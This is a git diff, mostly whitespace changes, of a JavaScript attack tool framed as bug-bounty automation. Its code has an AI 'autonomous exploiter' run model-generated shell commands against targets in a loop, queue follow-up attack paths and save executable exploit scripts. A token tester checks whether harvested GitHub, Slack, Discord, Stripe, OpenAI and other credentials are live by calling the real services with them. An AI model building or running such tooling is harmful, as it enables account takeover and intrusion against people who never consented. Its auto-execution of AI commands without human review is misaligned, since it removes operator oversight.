         log('🤝 AI COLLABORATION: Processing browser data...', 'magenta');
-        
+
         // Update browser AI context
         this.browserAIContext = {
             domain: browserData.domain || browserData.url || 'unknown',
@@ -5446,15 +5446,15 @@ Respond in JSON:
             highCount: browserFindings.filter(f => f.severity === 'high' || f.severity === 'HIGH').length,
             liveCount: browserFindings.filter(f => f.live).length
         };
-        
+
         // STEP 1: Research each token before AI analysis
         log('🔬 Researching tokens...', 'cyan');
         const enrichedFindings = [];
-        
+
         for (const finding of browserFindings.slice(0, 50)) {  // Limit to 50 findings
             const type = finding.type || finding.patternName || AIMemory.guessType(finding.value || '');
             const research = await TokenResearch.research(finding.value, type);
-            
+
             enrichedFindings.push({
                 ...finding,
                 type,
@@ -5463,14 +5463,14 @@ Respond in JSON:
                 recommendations: AIMemory.getExploitRecommendations(type)
             });
         }
-        
+
         // STEP 2: Build comprehensive prompt with research data
         const prompt = `The BROWSER AI has sent ${browserFindings.length} findings from: ${browserData.domain || browserData.url || 'unknown'}
 
 ENRICHED FINDINGS (with research):
 ${enrichedFindings.slice(0, 20).map((f, i) => {
-    const r = f.research;
-    return `[${i}] TYPE: ${f.type}
+            const r = f.research;
+            return `[${i}] TYPE: ${f.type}
     VALUE: ${(f.value || '').substring(0, 40)}...
     SERVICE: ${r?.service || 'Unknown'}
     IMPACT: ${r?.impact || 'Unknown'}
@@ -5478,7 +5478,7 @@ ${enrichedFindings.slice(0, 20).map((f, i) => {
     TEST COMMANDS: ${r?.exploitCommands?.slice(0, 2).join(' | ') || 'None'}
     LEARNED EXPLOITS: ${f.recommendations?.length || 0} from memory
     SEVERITY: ${f.severity || 'unknown'}`;
-}).join('\n\n')}
+        }).join('\n\n')}
 
 BROWSER CONTEXT:
 - URL: ${browserData.url || 'unknown'}
@@ -5533,20 +5533,20 @@ Respond in this JSON format:
     "remediation": ["Fix 1", "Fix 2"]
   }
 }`;
-        
+
         try {
             const response = await this.query(prompt, {
                 systemPrompt: AI_SYSTEM_PROMPTS.collaborator,
                 collaboration: true,
                 browserData: browserData
             });
-            
+
             // Log collaboration in AIMemory
-            AIMemory.recordConversation('browser', 'terminal', 
+            AIMemory.recordConversation('browser', 'terminal',
                 { findingsCount: browserFindings.length, domain: browserData.domain },
                 response
             );
-            
+
             // Log collaboration locally
             const collabEntry = {
                 timestamp: new Date().toISOString(),
@@ -5556,19 +5556,19 @@ Respond in this JSON format:
                 domain: browserData.domain
             };
             this.collaborationLog.push(collabEntry);
-            
+
             // Save collab log
             try {
                 fs.writeFileSync(CONFIG.AI_COLLAB_LOG, JSON.stringify(this.collaborationLog, null, 2));
-            } catch(e) {}
-            
+            } catch (e) { }
+
             // Parse and display the response
             if (typeof response === 'string') {
                 try {
                     const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
                     if (jsonMatch) {
                         const parsed = JSON.parse(jsonMatch);
-                        
+
                         // Display terminal-side analysis
                         log('', 'cyan');
                         logBox('🤝 AI COLLABORATION RESULT', [
@@ -5584,7 +5584,7 @@ Respond in this JSON format:
                             `Next Browser Actions: ${parsed.nextBrowserActions?.length || 0}`,
                             `Operator Actions: ${parsed.operatorActions?.length || 0}`
                         ], 'magenta');
-                        
+
                         // Show detailed critical findings
                         if (parsed.criticalFindings?.length > 0) {
                             log('\n📛 CRITICAL FINDINGS:', 'red');
@@ -5598,7 +5598,7 @@ Respond in this JSON format:
                                 }
                             }
                         }
-                        
+
                         // Auto-execute validation commands
                         if (CONFIG.AUTO_AI_ANALYZE && parsed.criticalFindings) {
                             log('\n🔍 AUTO-VALIDATING CRITICAL FINDINGS...', 'cyan');
@@ -5607,7 +5607,7 @@ Respond in this JSON format:
                                     log(`   Executing: ${cf.validateCommand.substring(0, 60)}...`, 'cyan');
                                     const result = await CommandExecutor.execute(cf.validateCommand);
                                     cf.validationResult = result;
-                                    
+
                                     // Learn from validation
                                     const finding = enrichedFindings[cf.index];
                                     if (finding) {
@@ -5618,7 +5618,7 @@ Respond in this JSON format:
                                             { success: result.success, command: cf.validateCommand, output: result.output?.substring(0, 500) }
                                         );
                                     }
-                                    
+
                                     // Display result
                                     if (result.success) {
                                         log(`   ✅ VALID: ${result.output?.substring(0, 100) || 'Success'}`, 'green');
@@ -5628,10 +5628,10 @@ Respond in this JSON format:
                                 }
                             }
                         }
-                        
+
                         // Save AIMemory
                         AIMemory.save();
-                        
+
                         // 🔥 TRIGGER AUTONOMOUS EXPLOITER
                         if (CONFIG.AUTO_AI_ANALYZE && enrichedFindings.length > 0) {
                             log('\n🔥 Launching Autonomous Exploiter...', 'red');
@@ -5641,7 +5641,7 @@ Respond in this JSON format:
                                 log(`Exploiter error: ${e.message}`, 'red');
                             });
                         }
-                        
+
                         // Send back enriched response to browser AI
                         if (ws && ws.readyState === WebSocket.OPEN) {
                             ws.send(JSON.stringify({
@@ -5658,27 +5658,27 @@ Respond in this JSON format:
                             }));
                             log('📤 Collaboration response sent to browser AI', 'green');
                         }
-                        
+
                         return parsed;
                     }
-                } catch(e) {
+                } catch (e) {
                     log(`Collab response parse warning: ${e.message}`, 'yellow');
                 }
             }
-            
+
             return response;
-        } catch(e) {
+        } catch (e) {
             log(`AI Collaboration error: ${e.message}`, 'red');
             return null;
         }
     },
-    
+
     // Send a task request to browser AI
     async sendToBrowserAI(task, data, ws) {
         if (!ws || ws.readyState !== WebSocket.OPEN) return;
-        
+
         const taskId = generateToken().substring(0, 8);
-        
+
         ws.send(JSON.stringify({
             type: 'ai_task',
             taskId,
@@ -5687,31 +5687,31 @@ Respond in this JSON format:
             fromTerminalAI: true,
             timestamp: new Date().toISOString()
         }));
-        
+
         this.pendingCollabTasks.push({ taskId, task, sentAt: Date.now() });
         log(`📤 Task sent to browser AI: ${task}`, 'magenta');
-        
+
         return taskId;
     },
-    
+
     // Process response from browser AI
     async handleBrowserAIResponse(message, ws) {
         log(`📥 Browser AI response: ${message.taskId || 'direct'}`, 'magenta');
-        
+
         // Remove from pending
         this.pendingCollabTasks = this.pendingCollabTasks.filter(t => t.taskId !== message.taskId);
-        
+
         // If browser AI sent new findings, analyze them
         if (message.findings && message.findings.length > 0) {
             log(`🔍 Browser AI found ${message.findings.length} new items`, 'green');
             message.findings.forEach(f => DataStore.addFinding(f));
-            
+
             // Run deeper analysis on new findings
             if (this.config.deepAnalysis && message.findings.length > 0) {
                 await this.processCollaboration(message.findings, message.browserData || {}, ws);
             }
         }
-        
+
         // Log collaboration
         this.collaborationLog.push({
             timestamp: new Date().toISOString(),
@@ -5729,7 +5729,7 @@ Respond in this JSON format:
 const CommandExecutor = {
     history: [],
     results: [],
-    
+
     // Allowed commands (security whitelist) - comprehensive for bug bounty
     allowedCommands: [
         // HTTP/API testing
@@ -5750,21 +5750,21 @@ const CommandExecutor = {
         // Extras
         'env', 'export', 'set', 'history', 'clear', 'sleep', 'timeout', 'xargs'
     ],
-    
+
     isAllowed(command) {
         const cmd = command.trim().split(/\s+/)[0];
         const baseCmd = path.basename(cmd);
         return this.allowedCommands.includes(baseCmd);
     },
-    
+
     // Execute command
     async execute(command, timeout = CONFIG.COMMAND_TIMEOUT) {
         return new Promise((resolve) => {
             const startTime = Date.now();
-            
+
             // Log command
             log(`$ ${command.substring(0, 100)}${command.length > 100 ? '...' : ''}`, 'cyan');
-            
+
             if (!this.isAllowed(command)) {
                 const result = {
                     success: false,
@@ -5776,14 +5776,14 @@ const CommandExecutor = {
                 resolve(result);
                 return;
             }
-            
+
             exec(command, {
                 timeout,
                 maxBuffer: 1024 * 1024 * 50, // 50MB
                 shell: os.platform() === 'win32' ? 'cmd.exe' : '/bin/bash'
             }, (error, stdout, stderr) => {
                 const duration = Date.now() - startTime;
-                
+
                 const result = {
                     success: !error,
                     command,
@@ -5794,10 +5794,10 @@ const CommandExecutor = {
                     duration,
                     timestamp: new Date().toISOString()
                 };
-                
+
                 this.history.push(result);
                 this.results.push(result);
-                
+
                 // Log result
                 if (result.success) {
                     log(`✓ Success (${duration}ms)`, 'green');
@@ -5807,50 +5807,50 @@ const CommandExecutor = {
                 } else {
                     log(`✗ Failed: ${result.error}`, 'red');
                 }
-                
+
                 resolve(result);
             });
         });
     },
-    
+
     // Execute multiple commands
     async executeBatch(commands, delay = 500) {
         const results = [];
-        
+
         for (let i = 0; i < commands.length; i++) {
             log(`[${i + 1}/${commands.length}] Executing...`, 'blue');
             const result = await this.execute(commands[i]);
             results.push(result);
-            
+
             if (i < commands.length - 1) {
                 await new Promise(r => setTimeout(r, delay));
             }
         }
-        
+
         return results;
     },
-    
+
     // Execute with AI analysis
     async executeWithAI(command) {
         const result = await this.execute(command);
-        
+
         if (result.success && TerminalAI.config.isActive) {
             log('🤖 AI analyzing result...', 'magenta');
-            
+
             const analysis = await TerminalAI.query(`Analyze this command output for security implications:
 
 Command: ${command}
 Output: ${result.stdout.substring(0, 2000)}
 
 Is there any sensitive data exposed? What are the next exploitation steps?`);
-            
+
             result.aiAnalysis = analysis;
-            
+
             if (typeof analysis === 'string' && analysis.length < 500) {
                 console.log(`${C.magenta}AI: ${analysis}${C.reset}`);
             }
         }
-        
+
         return result;
     }
 };
@@ -5869,7 +5869,7 @@ const AutonomousExploiter = {
     maxIterations: 50,
     currentIteration: 0,
     ws: null,  // WebSocket reference
-    
+
     // Deep analysis prompts for professional-level analysis
     ANALYSIS_PROMPTS: {
         initial: `You are an elite bug bounty hunter AI. Analyze these findings with EXTREME DEPTH:
@@ -5964,7 +5964,7 @@ Generate a comprehensive bash/python script that:
 
 Output the COMPLETE script, ready to execute.`
     },
-    
+
     // Initialize exploiter with WebSocket reference
     init(ws) {
         this.ws = ws;
@@ -5972,11 +5972,11 @@ Output the COMPLETE script, ready to execute.`
         this.currentIteration = 0;
         log('🔥 AutonomousExploiter initialized', 'magenta');
     },
-    
+
     // Extract commands from text (curl, wget, etc.)
     extractCommands(text) {
         const commands = [];
-        
+
         // Curl commands
         const curlRegex = /curl\s+(?:-[A-Za-z]+\s+)*(?:'[^']*'|"[^"]*"|[^\s|&;]+)+(?:\s+(?:-[A-Za-z]+\s+)*(?:'[^']*'|"[^"]*"|[^\s|&;]+)+)*/gi;
         const curlMatches = text.match(curlRegex) || [];
@@ -5984,56 +5984,56 @@ Output the COMPLETE script, ready to execute.`
             const cleaned = cmd.replace(/\\n/g, ' ').trim();
             if (cleaned.length > 10) commands.push({ type: 'curl', cmd: cleaned });
         });
-        
+
         // wget commands
         const wgetRegex = /wget\s+[^\n|&;]+/gi;
         const wgetMatches = text.match(wgetRegex) || [];
         wgetMatches.forEach(cmd => commands.push({ type: 'wget', cmd: cmd.trim() }));
-        
+
         // httpie commands
         const httpRegex = /(?:http|https)\s+(?:GET|POST|PUT|DELETE|PATCH)\s+[^\n|&;]+/gi;
         const httpMatches = text.match(httpRegex) || [];
         httpMatches.forEach(cmd => commands.push({ type: 'httpie', cmd: cmd.trim() }));
-        
+
         // nmap commands
         const nmapRegex = /nmap\s+[^\n|&;]+/gi;
         const nmapMatches = text.match(nmapRegex) || [];
         nmapMatches.forEach(cmd => commands.push({ type: 'nmap', cmd: cmd.trim() }));
-        
+
         // sqlmap commands
         const sqlmapRegex = /sqlmap\s+[^\n|&;]+/gi;
         const sqlmapMatches = text.match(sqlmapRegex) || [];
         sqlmapMatches.forEach(cmd => commands.push({ type: 'sqlmap', cmd: cmd.trim() }));
-        
+
         // ffuf/gobuster commands
         const fuzzerRegex = /(?:ffuf|gobuster|dirb|wfuzz)\s+[^\n|&;]+/gi;
         const fuzzerMatches = text.match(fuzzerRegex) || [];
         fuzzerMatches.forEach(cmd => commands.push({ type: 'fuzzer', cmd: cmd.trim() }));
-        
+
         // nuclei commands
         const nucleiRegex = /nuclei\s+[^\n|&;]+/gi;
         const nucleiMatches = text.match(nucleiRegex) || [];
         nucleiMatches.forEach(cmd => commands.push({ type: 'nuclei', cmd: cmd.trim() }));
-        
+
         return commands;
     },
-    
+
     // Build commands from findings
     buildCommandsFromFindings(findings) {
         const commands = [];
-        
+
         for (const finding of findings) {
             const type = (finding.type || finding.patternName || '').toLowerCase();
             const value = finding.value || '';
             const research = finding.research || {};
-            
+
             // Use research-provided commands
             if (research.exploitCommands) {
                 research.exploitCommands.forEach(cmd => {
                     commands.push({ type: 'research', cmd, finding });
                 });
             }
-            
+
             // API Key testing
             if (type.includes('api') || type.includes('key') || type.includes('token')) {
                 if (type.includes('google') || type.includes('gcp') || value.startsWith('AIza')) {
@@ -6048,7 +6048,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('aws') || value.startsWith('AKIA')) {
                     commands.push({
                         type: 'aws',
@@ -6056,7 +6056,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('firebase')) {
                     const projectMatch = value.match(/([a-z0-9-]+)\.firebaseio\.com/);
                     if (projectMatch) {
@@ -6067,7 +6067,7 @@ Output the COMPLETE script, ready to execute.`
                         });
                     }
                 }
-                
+
                 if (type.includes('stripe') || value.startsWith('sk_')) {
                     commands.push({
                         type: 'stripe',
@@ -6075,7 +6075,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('github') || value.startsWith('ghp_')) {
                     commands.push({
                         type: 'github',
@@ -6083,7 +6083,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('slack') || value.startsWith('xox')) {
                     commands.push({
                         type: 'slack',
@@ -6091,7 +6091,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('twilio')) {
                     commands.push({
                         type: 'twilio',
@@ -6099,7 +6099,7 @@ Output the COMPLETE script, ready to execute.`
                         finding
                     });
                 }
-                
+
                 if (type.includes('sendgrid')) {
                     commands.push({
                         type: 'sendgrid',
@@ -6108,7 +6108,7 @@ Output the COMPLETE script, ready to execute.`
                     });
                 }
             }
-            
+
             // JWT Testing
             if (type.includes('jwt') || /^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+/.test(value)) {
                 const parts = value.split('.');
@@ -6121,7 +6121,7 @@ Output the COMPLETE script, ready to execute.`
                     });
                 }
             }
-            
+
             // URL/Endpoint testing
             if (type.includes('url') || type.includes('endpoint') || value.startsWith('http')) {
                 commands.push({
@@ -6138,22 +6138,22 @@ Output the COMPLETE script, ready to execute.`
                 });
             }
         }
-        
+
         return commands;
     },
-    
+
     // Run autonomous exploitation
     async run(findings, browserData = {}) {
         if (this.isRunning) {
             log('⚠️ Autonomous exploiter already running', 'yellow');
             return;
         }
-        
+
         this.isRunning = true;
         this.currentIteration = 0;
         this.vulnerabilitiesFound = [];
         this.scriptsGenerated = [];
-        
+
         logBox('🔥 AUTONOMOUS EXPLOITER STARTED', [
             `Findings to analyze: ${findings.length}`,
             `Domain: ${browserData.domain || 'unknown'}`,
@@ -6166,21 +6166,21 @@ Output the COMPLETE script, ready to execute.`
             '  • Find alternative attack paths',
             '  • Continue until fully explored'
         ], 'red');
-        
+
         try {
             // PHASE 1: Deep AI Analysis of findings
             log('\n📊 PHASE 1: Deep Analysis...', 'magenta');
             const analysis = await this.deepAnalyzeFindings(findings, browserData);
-            
+
             if (!analysis) {
                 log('❌ Analysis failed, stopping', 'red');
                 this.isRunning = false;
                 return;
             }
-            
+
             // PHASE 2: Build command queue from AI analysis + findings
             log('\n⚡ PHASE 2: Building command queue...', 'cyan');
-            
+
             // Commands from AI analysis
             if (analysis.exploits) {
                 for (const exploit of analysis.exploits) {
@@ -6210,7 +6210,7 @@ Output the COMPLETE script, ready to execute.`
                     }
                 }
             }
-            
+
             // Commands built from findings
             const findingCommands = this.buildCommandsFromFindings(findings);
             findingCommands.forEach(c => {
@@ -6222,26 +6222,26 @@ Output the COMPLETE script, ready to execute.`
                     });
                 }
             });
-            
+
             log(`📋 ${this.exploitQueue.length} commands queued for execution`, 'yellow');
-            
+
             // PHASE 3: Execute commands and analyze outputs
             log('\n🚀 PHASE 3: Executing commands...', 'green');
             await this.executeQueue(browserData);
-            
+
             // PHASE 4: Generate scripts
             log('\n📜 PHASE 4: Generating exploitation scripts...', 'magenta');
             await this.generateExploitScripts(browserData);
-            
+
             // PHASE 5: Report
             this.generateReport(browserData);
-            
+
         } finally {
             this.isRunning = false;
             log('\n🏁 Autonomous exploitation complete', 'green');
         }
     },
-    
+
     // Deep analyze findings with AI
     async deepAnalyzeFindings(findings, browserData) {
         const prompt = this.ANALYSIS_PROMPTS.initial
@@ -6254,16 +6254,16 @@ Output the COMPLETE script, ready to execute.`
                 research: f.research
             })), null, 2))
             .replace('{{DOMAIN}}', browserData.domain || 'unknown');
-        
+
         const response = await TerminalAI.query(prompt, { deepAnalysis: true });
-        
+
         if (typeof response === 'string') {
             try {
                 const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
                 if (jsonMatch) {
                     const parsed = JSON.parse(jsonMatch);
                     this.analysisHistory.push({ type: 'initial', data: parsed });
-                    
+
                     // Display analysis summary
                     if (parsed.analysis) {
                         logBox('📊 AI DEEP ANALYSIS', [
@@ -6273,36 +6273,36 @@ Output the COMPLETE script, ready to execute.`
                             `${(parsed.analysis.summary || '').substring(0, 100)}...`
                         ], 'magenta');
                     }
-                    
+
                     return parsed;
                 }
-            } catch(e) {
+            } catch (e) {
                 log(`Parse error: ${e.message}`, 'yellow');
             }
         }
-        
+
         return null;
     },
-    
+
     // Execute queued commands
     async executeQueue(browserData) {
         while (this.exploitQueue.length > 0 && this.currentIteration < this.maxIterations) {
             const item = this.exploitQueue.shift();
             this.currentIteration++;
-            
+
             if (this.executedCommands.has(item.cmd)) continue;
             this.executedCommands.add(item.cmd);
-            
+
             log(`\n[${this.currentIteration}/${this.maxIterations}] ${item.purpose || 'Testing...'}`, 'cyan');
             log(`   Source: ${item.source}`, 'dim');
-            
+
             // Execute command
             const result = await CommandExecutor.execute(item.cmd);
-            
+
             if (result.success && result.stdout) {
                 // AI analyze the output
                 const outputAnalysis = await this.analyzeOutput(item.cmd, result.stdout, browserData);
-                
+
                 if (outputAnalysis) {
                     // Record vulnerability if found
                     if (outputAnalysis.isVulnerable) {
@@ -6312,11 +6312,11 @@ Output the COMPLETE script, ready to execute.`
                             analysis: outputAnalysis,
                             timestamp: new Date().toISOString()
                         });
-                        
+
                         log(`   🔴 VULNERABILITY FOUND: ${outputAnalysis.vulnerabilityType}`, 'red');
                         log(`   Confidence: ${outputAnalysis.confidenceLevel}`, 'yellow');
                     }
-                    
+
                     // Add discovered commands to queue
                     if (outputAnalysis.nextCommands) {
                         for (const nextCmd of outputAnalysis.nextCommands) {
@@ -6330,7 +6330,7 @@ Output the COMPLETE script, ready to execute.`
                             }
                         }
                     }
-                    
+
                     // Try alternative paths if not vulnerable
                     if (!outputAnalysis.isVulnerable && outputAnalysis.alternativePaths) {
                         for (const altPath of outputAnalysis.alternativePaths.slice(0, 3)) {
@@ -6348,25 +6348,25 @@ Output the COMPLETE script, ready to execute.`
                     }
                 }
             }
-            
+
             // Rate limit protection
             await new Promise(r => setTimeout(r, 1000));
         }
     },
-    
+
     // Analyze command output with AI
     async analyzeOutput(command, output, browserData) {
-        const context = this.analysisHistory.slice(-3).map(h => 
+        const context = this.analysisHistory.slice(-3).map(h =>
             `${h.type}: ${JSON.stringify(h.data).substring(0, 200)}`
         ).join('\n');
-        
+
         const prompt = this.ANALYSIS_PROMPTS.outputAnalysis
             .replace('{{COMMAND}}', command)
             .replace('{{OUTPUT}}', output.substring(0, 3000))
             .replace('{{CONTEXT}}', context);
-        
+
         const response = await TerminalAI.query(prompt, { deepAnalysis: true });
-        
+
         if (typeof response === 'string') {
             try {
                 const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
@@ -6375,60 +6375,60 @@ Output the COMPLETE script, ready to execute.`
                     this.analysisHistory.push({ type: 'output_analysis', command, data: parsed });
                     return parsed;
                 }
-            } catch(e) {}
+            } catch (e) { }
         }
-        
+
         return null;
     },
-    
+
     // Generate exploitation scripts
     async generateExploitScripts(browserData) {
         if (this.vulnerabilitiesFound.length === 0) {
             log('No confirmed vulnerabilities for script generation', 'yellow');
             return;
         }
-        
+
         const prompt = this.ANALYSIS_PROMPTS.scriptGeneration
             .replace('{{DOMAIN}}', browserData.domain || 'unknown')
             .replace('{{FINDINGS}}', JSON.stringify(this.analysisHistory[0]?.data?.exploits?.slice(0, 10) || []))
             .replace('{{VULNS}}', JSON.stringify(this.vulnerabilitiesFound.slice(0, 10)));
-        
+
         const response = await TerminalAI.query(prompt, { deepAnalysis: true });
-        
+
         if (typeof response === 'string') {
             // Extract scripts from response
             const bashScript = response.match(/```bash\n([\s\S]*?)```/)?.[1];
             const pythonScript = response.match(/```python\n([\s\S]*?)```/)?.[1];
-            
+
             if (bashScript) {
                 const scriptPath = `exploit_${browserData.domain || 'target'}_${Date.now()}.sh`;
                 this.scriptsGenerated.push({ type: 'bash', path: scriptPath, content: bashScript });
-                
+
                 try {
                     fs.writeFileSync(scriptPath, bashScript);
                     log(`📜 Bash script saved: ${scriptPath}`, 'green');
-                    
+
                     // Make executable
                     if (os.platform() !== 'win32') {
                         fs.chmodSync(scriptPath, '755');
                     }
-                } catch(e) {
+                } catch (e) {
                     log(`Could not save script: ${e.message}`, 'yellow');
                 }
             }
-            
+
             if (pythonScript) {
                 const scriptPath = `exploit_${browserData.domain || 'target'}_${Date.now()}.py`;
                 this.scriptsGenerated.push({ type: 'python', path: scriptPath, content: pythonScript });
-                
+
                 try {
                     fs.writeFileSync(scriptPath, pythonScript);
                     log(`🐍 Python script saved: ${scriptPath}`, 'green');
-                } catch(e) {}
+                } catch (e) { }
             }
         }
     },
-    
+
     // Generate final report
     generateReport(browserData) {
         logBox('🔥 AUTONOMOUS EXPLOITATION REPORT', [
@@ -6439,14 +6439,14 @@ Output the COMPLETE script, ready to execute.`
             `Scripts Generated: ${this.scriptsGenerated.length}`,
             '',
             '--- Vulnerabilities ---',
-            ...this.vulnerabilitiesFound.slice(0, 5).map((v, i) => 
-                `[${i+1}] ${v.analysis?.vulnerabilityType || 'Unknown'} (${v.analysis?.confidenceLevel || 'N/A'})`
+            ...this.vulnerabilitiesFound.slice(0, 5).map((v, i) =>
+                `[${i + 1}] ${v.analysis?.vulnerabilityType || 'Unknown'} (${v.analysis?.confidenceLevel || 'N/A'})`
             ),
             '',
             '--- Generated Scripts ---',
             ...this.scriptsGenerated.map(s => `  ${s.type}: ${s.path}`)
         ], 'red');
-        
+
         // Send report to browser
         if (this.ws && this.ws.readyState === WebSocket.OPEN) {
             this.ws.send(JSON.stringify({
@@ -6461,14 +6461,14 @@ Output the COMPLETE script, ready to execute.`
             }));
         }
     },
-    
+
     // Stop exploitation
     stop() {
         this.isRunning = false;
         this.exploitQueue = [];
         log('🛑 Autonomous exploiter stopped', 'yellow');
     },
-    
+
     // Get status
     status() {
         return {
@@ -6492,12 +6492,12 @@ const TokenTester = {
     liveTokens: [],
     deadTokens: [],
     stats: { total: 0, live: 0, dead: 0, errors: 0 },
-    
+
     // Rate limiting protection
     requestDelay: 1500,  // 1.5 seconds between requests
     maxRetries: 3,
     retryDelay: 5000,    // 5 seconds on rate limit
-    
+
     // Token test configurations - NO AI NEEDED, direct API calls
     testConfigs: {
         // GitHub tokens
@@ -6510,19 +6510,19 @@ const TokenTester = {
                 const lines = result.stdout.trim().split('\n');
                 const statusCode = lines.pop();
                 const body = lines.join('\n');
-                
+
                 if (statusCode === '200') {
                     try {
                         const data = JSON.parse(body);
                         return { live: true, user: data.login, type: data.type, scopes: result.stderr?.match(/x-oauth-scopes: ([^\n]+)/)?.[1] };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: true, raw: body.substring(0, 100) };
                     }
                 }
                 return { live: false, status: statusCode };
             }
         },
-        
+
         // Slack tokens
         slack: {
             patterns: [/^xox[baprs]-/],
@@ -6533,12 +6533,12 @@ const TokenTester = {
                 try {
                     const data = JSON.parse(result.stdout);
                     return { live: data.ok === true, team: data.team, user: data.user, error: data.error };
-                } catch(e) {
+                } catch (e) {
                     return { live: false, error: e.message };
                 }
             }
         },
-        
+
         // Discord tokens
         discord: {
             patterns: [/^[MN][A-Za-z0-9]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/],
@@ -6548,19 +6548,19 @@ const TokenTester = {
                 const lines = result.stdout.trim().split('\n');
                 const statusCode = lines.pop();
                 const body = lines.join('\n');
-                
+
                 if (statusCode === '200') {
                     try {
                         const data = JSON.parse(body);
                         return { live: true, username: data.username, id: data.id, email: data.email };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: true };
                     }
                 }
                 return { live: false, status: statusCode };
             }
         },
-        
+
         // Stripe keys
         stripe: {
             patterns: [/^sk_live_[A-Za-z0-9]{24,}$/, /^rk_live_/],
@@ -6571,19 +6571,19 @@ const TokenTester = {
                 const lines = result.stdout.trim().split('\n');
                 const statusCode = lines.pop();
                 const body = lines.join('\n');
-                
+
                 if (statusCode === '200') {
                     try {
                         const data = JSON.parse(body);
                         return { live: true, currency: data.available?.[0]?.currency, livemode: data.livemode };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: true };
                     }
                 }
                 return { live: false, status: statusCode };
             }
         },
-        
+
         // Twilio
         twilio: {
             patterns: [/^SK[a-f0-9]{32}$/],
@@ -6597,7 +6597,7 @@ const TokenTester = {
                 return { live: statusCode === '200', status: statusCode };
             }
         },
-        
+
         // SendGrid
         sendgrid: {
             patterns: [/^SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/],
@@ -6607,20 +6607,20 @@ const TokenTester = {
                 const result = await CommandExecutor.execute(cmd);
                 const lines = result.stdout.trim().split('\n');
                 const statusCode = lines.pop();
-                
+
                 if (statusCode === '200') {
                     try {
                         const body = lines.join('\n');
                         const data = JSON.parse(body);
                         return { live: true, username: data.username };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: true };
                     }
                 }
                 return { live: false, status: statusCode };
             }
         },
-        
+
         // Telegram Bot
         telegram: {
             patterns: [/^\d+:[A-Za-z0-9_-]{35}$/],
@@ -6630,12 +6630,12 @@ const TokenTester = {
                 try {
                     const data = JSON.parse(result.stdout);
                     return { live: data.ok === true, botName: data.result?.username, botId: data.result?.id };
-                } catch(e) {
+                } catch (e) {
                     return { live: false, error: e.message };
                 }
             }
         },
-        
+
         // Firebase/Google API keys
         google: {
             patterns: [/^AIza[A-Za-z0-9_-]{35}$/],
@@ -6647,12 +6647,12 @@ const TokenTester = {
                 try {
                     const data = JSON.parse(result.stdout);
                     return { live: data.status !== 'REQUEST_DENIED', status: data.status, error: data.error_message };
-                } catch(e) {
+                } catch (e) {
                     return { live: false, error: e.message };
                 }
             }
         },
-        
+
         // AWS Access Keys
         aws: {
             patterns: [/^AKIA[0-9A-Z]{16}$/],
@@ -6662,7 +6662,7 @@ const TokenTester = {
                 return { live: 'needs_secret', format: 'valid_aws_key_id', note: 'Requires secret key to fully test' };
             }
         },
-        
+
         // OpenAI
         openai: {
             patterns: [/^sk-[A-Za-z0-9]{48}$/],
@@ -6670,7 +6670,7 @@ const TokenTester = {
             test: async (token) => {
                 // Skip if it's a Stripe key
                 if (token.includes('live_') || token.includes('test_')) return { live: false, skip: true };
-                
+
                 const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: Bearer ${token}" https://api.openai.com/v1/models`;
                 const result = await CommandExecutor.execute(cmd);
                 const lines = result.stdout.trim().split('\n');
@@ -6678,7 +6678,7 @@ const TokenTester = {
                 return { live: statusCode === '200', status: statusCode };
             }
         },
-        
+
         // Mailchimp
         mailchimp: {
             patterns: [/^[a-f0-9]{32}-us\d+$/],
@@ -6691,7 +6691,7 @@ const TokenTester = {
                 return { live: statusCode === '200', status: statusCode };
             }
         },
-        
+
         // Heroku
         heroku: {
             patterns: [/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/],
@@ -6703,7 +6703,7 @@ const TokenTester = {
                 return { live: statusCode === '200', status: statusCode };
             }
         },
-        
+
         // NPM tokens
         npm: {
             patterns: [/^npm_[A-Za-z0-9]{36}$/],
@@ -6714,19 +6714,19 @@ const TokenTester = {
                 const lines = result.stdout.trim().split('\n');
                 const statusCode = lines.pop();
                 const body = lines.join('\n');
-                
+
                 if (statusCode === '200') {
                     try {
                         const data = JSON.parse(body);
                         return { live: true, username: data.username };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: true };
                     }
                 }
                 return { live: false, status: statusCode };
             }
         },
-        
+
         // PyPI tokens
         pypi: {
             patterns: [/^pypi-[A-Za-z0-9_-]{60,}$/],
@@ -6736,7 +6736,7 @@ const TokenTester = {
                 return { live: 'unknown', note: 'PyPI tokens need upload test' };
             }
         },
-        
+
         // Generic JWT
         jwt: {
             patterns: [/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/],
@@ -6748,8 +6748,8 @@ const TokenTester = {
                         const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                         const exp = payload.exp ? new Date(payload.exp * 1000) : null;
                         const isExpired = exp ? exp < new Date() : 'unknown';
-                        return { 
-                            live: !isExpired, 
+                        return {
+                            live: !isExpired,
                             payload: {
                                 iss: payload.iss,
                                 sub: payload.sub,
@@ -6758,7 +6758,7 @@ const TokenTester = {
                             },
                             expired: isExpired
                         };
-                    } catch(e) {
+                    } catch (e) {
                         return { live: false, error: 'Invalid JWT' };
                     }
                 }
@@ -6766,7 +6766,7 @@ const TokenTester = {
             }
         }
     },
-    
+
     // Identify token type
     identifyToken(value) {
         for (const [type, config] of Object.entries(this.testConfigs)) {
@@ -6781,19 +6781,19 @@ const TokenTester = {
         }
